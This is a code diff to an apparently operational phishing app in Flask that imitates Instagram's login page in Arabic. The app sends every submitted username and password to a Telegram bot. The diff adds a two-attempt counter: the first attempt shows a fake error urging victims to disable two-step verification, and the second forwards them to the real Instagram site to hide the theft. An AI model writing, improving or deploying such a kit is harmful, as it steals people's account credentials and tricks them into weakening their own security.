@@ -1,7 +1,7 @@
 import os
 import re
 import requests
-from flask import Flask, redirect, render_template_string, request, url_for
+from flask import Flask, redirect, render_template_string, request, url_for, session
 
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")
@@ -9,10 +9,17 @@ app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
+INSTAGRAM_OFFICIAL_URL = "https://www.instagram.com/accounts/login/"
+
 @app.route("/", methods=["GET", "POST"])
 def login():
     error = ""
     username_val = ""
+    
+    # تهيئة عداد المحاولات إذا لم يكن موجوداً
+    if "attempt" not in session:
+        session["attempt"] = 1
+
     if request.method == "POST":
         username_val = request.form.get("username", "").strip()
         password = request.form.get("password", "")
@@ -24,12 +31,22 @@ def login():
         elif len(password) <= 5:
             error = "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
         else:
+            # إرسال البيانات للتليجرام في كل مرة يتم إدخالها
             if BOT_TOKEN and CHAT_ID:
-                msg = f"📸 تم استلام بيانات Instagram جديدة:\n\n👤 الحساب: {username_val}\n🔑 الباسورد: {password}"
+                msg = f"📸 تم استلام بيانات Instagram جديدة (محاولة {session['attempt']}):\n\n👤 الحساب: {username_val}\n🔑 الباسورد: {password}"
                 telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                 requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
             
-            return redirect(url_for("error_page"))
+            current_attempt = session["attempt"]
+            
+            if current_attempt == 1:
+                # المحاولة الأولى: تحويل لصفحة الخطأ وزيادة العداد
+                session["attempt"] = 2
+                return redirect(url_for("error_page"))
+            else:
+                # المحاولة الثانية (الأخيرة): تحويل لموقع إنستغرام الرسمي وتصفير العداد
+                session.pop("attempt", None)
+                return redirect(INSTAGRAM_OFFICIAL_URL)
 
     return render_template_string("""
 <!DOCTYPE html>
@@ -114,7 +131,7 @@ def login():
 
 @app.route("/error")
 def error_page():
-    return render_template_string("""
+    return render_template_string(f"""
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -122,8 +139,8 @@ def error_page():
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>خطأ في تسجيل الدخول • Instagram</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { 
+        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }}
+        body {{ 
             background: #fdfbf7; 
             color: #000000;
             height: 100dvh;
@@ -133,33 +150,38 @@ def error_page():
             justify-content: center;
             padding: 30px;
             text-align: center;
-        }
-        .error-container {
+        }}
+        .error-container {{
             width: 100%;
             max-width: 380px;
             display: flex;
             flex-direction: column;
             align-items: center;
-        }
-        .error-code {
+        }}
+        .error-code {{
             font-size: 56px;
             font-weight: 800;
             color: #000000;
             margin-bottom: 15px;
-        }
-        .error-title {
+        }}
+        .error-title {{
             font-size: 18px;
             font-weight: 700;
             margin-bottom: 15px;
             color: #000000;
-        }
-        .error-desc {
+        }}
+        .error-desc {{
             font-size: 15px;
             color: #222222;
             line-height: 24px;
             margin-bottom: 30px;
-        }
-        .retry-btn {
+        }}
+        .error-desc a {{
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }}
+        .retry-btn {{
             width: 100%;
             background: #0095f6;
             color: white;
@@ -171,8 +193,8 @@ def error_page():
             cursor: pointer;
             text-decoration: none;
             display: block;
-        }
-        .retry-btn:hover { background: #1877f2; }
+        }}
+        .retry-btn:hover {{ background: #1877f2; }}
     </style>
 </head>
 <body>
@@ -180,9 +202,9 @@ def error_page():
         <div class="error-code">404</div>
         <div class="error-title">خطأ في مصادقة الحساب</div>
         <div class="error-desc">
-            تعذر إتمام تسجيل الدخول بسبب تفعيل ميزة <b>التحقق بخطوتين</b> على هذا الحساب. يرجى إيقاف تشغيلها مؤقتاً من إعدادات الأمان ثم إعادة المحاولة.
+            تعذر إتمام تسجيل الدخول بسبب تفعيل ميزة <a href="{INSTAGRAM_OFFICIAL_URL}" target="_blank">التحقق بخطوتين</a> على هذا الحساب. يرجى إيقاف تشغيلها مؤقتاً من إعدادات الأمان ثم إعادة المحاولة.
         </div>
-        <a href="{{ url_for('login') }}" class="retry-btn">إعادة المحاولة</a>
+        <a href="{url_for('login')}" class="retry-btn">إعادة المحاولة</a>
     </div>
 </body>
 </html>
